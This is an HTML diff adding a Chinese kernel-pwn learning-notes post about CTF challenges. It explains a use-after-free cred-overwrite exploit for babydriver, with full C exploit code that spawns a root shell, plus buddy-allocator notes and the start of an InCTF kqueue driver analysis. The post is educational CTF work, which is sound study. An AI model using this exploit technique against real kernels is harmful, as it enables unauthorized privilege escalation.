@@ -150,6 +150,181 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">Kernel Pwn 入门 (4)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:30:08" itemprop="dateCreated datePublished" datetime="2023-02-28T22:30:08+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:31" itemprop="dateModified" datetime="2023-03-01T11:30:31+08:00">2023-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>19k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>18 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="babydriver-的本来解法"><a class="markdownIt-Anchor" href="#babydriver-的本来解法"></a> babydriver 的本来解法</h1>
+<blockquote>
+<p>摘自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/">资料</a><br />
+这道题在当年的解法据悉是通过 UAF 修改该进程的 cred 结构体的 uid、gid 为0，十分简单十分白给<br />
+但是此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object，这是因为 cred_jar 在创建时设置了 SLAB_ACCOUNT 标记，不会再与相同大小的 kmalloc-192 进行合并</p>
+</blockquote>
+<p>为深入理解，笔者决定还是进行一番研究。<br />
+原来的利用思路中也包含了UAF，其意在通过UAF直接修改cred结构体，将uid和gid直接改为0。<br />
+下面是4.4.72版本中cred结构体的声明：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>同样是两次打开设备，这里使用了fork函数产生了一个子进程，利用打开的设备修改子进程的cred结构体。至于为什么这里要使用fork函数，就需要了解一下fork函数的工作原理了。</p>
+<blockquote>
+<p>fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。在fork之后exec之前两个进程用的是相同的物理空间（内存区），子进程的代码段、数据段、堆栈都是指向父进程的物理空间，也就是说，两者的虚拟空间不同，但其对应的物理空间是同一个。当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间，如果不是因为exec，内核会给子进程的数据段、堆栈段分配相应的物理空间（至此两者有各自的进程空间，互不影响），而代码段继续共享父进程的物理空间（两者的代码完全相同）。而如果是因为exec，由于两者执行的代码不同，子进程的代码段也会分配单独的物理空间。<br />
+————————————————<br />
+版权声明：本文为CSDN博主「狂奔的乌龟」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />
+原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xy010902100449/article/details/44851453">https://blog.csdn.net/xy010902100449/article/details/44851453</a></p>
+</blockquote>
+<p>当我们fork出一个子进程时，子进程的cred结构体指针与父进程的指针值是一样的，但实际指向的物理地址已经发生了改变。如果我们事先将buf的大小改为cred结构体的大小，那么在fork出子进程时，内核就会将子进程的cred结构体分配到buf的位置，我们也就能够对其进行随意修改。不过笔者尚未找到一种快捷的计算cred、tty_operations等这类结构体的大小，只能一个类型一个类型向前找定义。若读者有更好的方法，还请不吝赐教。</p>
+<p>exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> f1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> f2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line">	ioctl(f1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">	close(f1);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="type">char</span> buf[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		write(f2, buf, <span class="number">28</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] The uid now is: %d.\033[0m\n&quot;</span>, getuid());</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\033[0m\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意：<strong>这里的wait(NULL)不可缺少</strong>，因为子进程不允许没有父进程存在，在子进程执行system时需要让父进程阻塞。如果没有这条语句，程序将会直接退出，子进程将会称为孤儿进程：</p>
+<blockquote>
+<p>（摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/tennysonsky/article/details/45969569?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165136928416781432992726%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165136928416781432992726&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-45969569.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&amp;utm_term=linux+%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B&amp;spm=1018.2226.3001.4187">资料</a>）<br />
+孤儿进程是没有父进程的进程，为避免孤儿进程退出时无法释放所占用的资源而变为僵尸进程（什么是僵尸进程，请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/tennysonsky/article/details/45966571">《特殊进程之僵尸进程》</a>），进程号为 1 的 init 进程将会接受这些孤儿进程，这一过程也被称为“收养”。init 进程就好像是一个孤儿院，专门负责处理孤儿进程的善后工作。每当出现一个孤儿进程的时候，内核就把孤 儿进程的父进程设置为 init ，而 init 进程会循环地 wait() 它的已经退出的子进程。这样，当一个孤儿进程凄凉地结束了其生命周期的时候，init 进程就会代表党和政府出面处理它的一切善后工作。因此孤儿进程并不会有什么危害。</p>
+</blockquote>
+<p>父进程结束后，我们实际上就失去了对子进程的控制，这样即使子进程成功执行的system函数，我们也无法获取到root权限，因为此时父进程已经结束，我们现在直接控制的是1号进程，也就是系统进程，而系统进程中我们的权限仍然是受限的。</p>
+<h1 id="heap-overflow"><a class="markdownIt-Anchor" href="#heap-overflow"></a> Heap Overflow</h1>
+<p>说到内核的堆溢出，就不能不了解内核分配堆空间内存的方式。在kernel pwn题目中，内核堆空间分配最为常用的函数就是kmalloc函数了，与用户态的malloc函数相似，其也是传入一个需要申请的大小，返回申请到的地址值，但在kmalloc的底层则是slab/slub系统和伙伴系统的协调合作。这里介绍一下最为简单的伙伴系统，slab系统择日再进行详细分析。</p>
+<h2 id="伙伴系统buddy-system"><a class="markdownIt-Anchor" href="#伙伴系统buddy-system"></a> 伙伴系统（Buddy System）</h2>
+<p>伙伴系统用于管理以页为最小单位的内存空间，能够在一定程度上减少内存空间中的碎片。其维护需要一组链表，每一个链表中保存大小相同的连续内存块，这些内存块的大小为一页的2次幂。且所有内存块的起始地址必须是内存块自身大小的整数倍。<br />
+<img src="1.png" alt="" /><br />
+<img src="2.png" alt="" /><br />
+如上图所示，每一个小的正方形都表示一页，用红线划去的是不允许出现在伙伴系统中的块。上面的两个不允许出现的块都是因为其起始地址不能被自身大小所整除。</p>
+<p>当需要分配2<sup>n</sup>个页大小的连续空间时，去链表组中检查保存2<sup>n</sup>页大小空间的链表中是否有块存在，如果存在则分配，若没有则查找2<sup>n+1</sup>的块是否存在，以此类推。</p>
+<p><img src="3.png" alt="" /><br />
+如上图中需要分配2页的连续空间，首先查找是否有2页的空闲空间块，发现没有，于是查找是否有4页的空闲空间块，还是没有，但是8页的空闲块有，于是分隔这个块，分割结果为：<br />
+<img src="4.png" alt="" /><br />
+这就是伙伴算法，伙伴系统就是基于伙伴算法实现的，整体上还是比较容易理解的。</p>
+<h2 id="例题inctf-kqueue"><a class="markdownIt-Anchor" href="#例题inctf-kqueue"></a> 例题：InCTF-Kqueue</h2>
+<p>这道题给出了源码，我们可以首先阅读源码来分析整个驱动详细的执行流程。（登入用户名ctf、密码kqueue）</p>
+<p>这个驱动只提供了一个接口：ioctl，有四个指令码，分别对应增删改查。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAVE          0xB105BABE</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">kqueue_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line">    </span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="type">void</span> *)&amp;request, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先看一下create_kquque函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">create_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="type">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// MAX_QUEUES = 5, 最多只能分配5块空间。</span></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="comment">// MAX_DATA_SIZE = 0x20, 大小不能超过0x20</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="type">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="type">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="type">char</span> *)(validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* For Validating pointers */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">void</span>* <span class="title function_">validate</span><span class="params">(<span class="type">void</span> *ptr)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ptr)&#123;</span><br><span class="line">        mutex_unlock(&amp;operations_lock);</span><br><span class="line">        err(<span class="string">&quot;[-] oops! Internal operation error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意这个函数成功创建一个kqueue的标志是在全局变量kqueues中保存新创建的kqueue。其中kqueues最多可以容纳5个kqueue。<br />
+kmalloc中的第二个参数GFP_KERNEL是内存分配的一个选项，具体详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010164190/article/details/84789220?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165769965716781685380293%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165769965716781685380293&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-84789220-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=gfp_kernel&amp;spm=1018.2226.3001.4187">资料</a>。<br />
